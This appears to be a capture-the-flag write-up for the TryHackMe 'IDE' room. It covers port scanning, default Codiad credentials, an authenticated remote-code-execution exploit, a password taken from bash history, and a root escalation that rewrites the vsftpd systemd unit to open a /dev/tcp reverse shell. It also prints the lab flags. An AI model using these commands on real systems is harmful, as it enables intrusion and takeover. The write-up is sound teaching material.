# [Challenge](https://tryhackme.com/room/ide)

# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 ide`)
```nmap
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.13.111
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


# EXPLOITATION
Firstly, I logged into the anonymous ftp:
```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
Mhh, so something uses the default password... good!
On the port 80 (http) there's only the Apache default page
On port 62337 there's Codiad 2.8.4; after some manual bruteforcing the login creds are `john:password`
There are some scripts here, let's search for an exploit: `CVE-2018-14009`: Remote Code Execution (Authenticated): `python3 49705.py http://ide:62337/ john password 10.8.13.111 8888 linux`
We're in! (`python3 -c "import pty; pty.spawn('/bin/bash')"`)
# PRIVILEGE ESCALATION
`/home/drac/.bash_history`: `mysql -u drac -p 'Th3dRaCULa1sR3aL'` we're drac! Let's grab `user.txt`: `02930d21a8eb009f6d26361b2d24a466`
`sudo -l`: `(ALL : ALL) /usr/sbin/service vsftpd restart`
We can modify the `vsftpd` configuration file (`/lib/systemd/system/vsftpd.service`) to gain a root shell: `echo -e "[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\nExecReload=/bin/kill -HUP $MAINPID\nExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/10.8.13.111/9999 0>&1'\n\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service`
Let's reload the daemon (`systemctl daemon-reload`), set a listener and... we're ROOT!
`root.txt`: `ce258cb16f47f1c66f0b0b77f4e0fb8d`
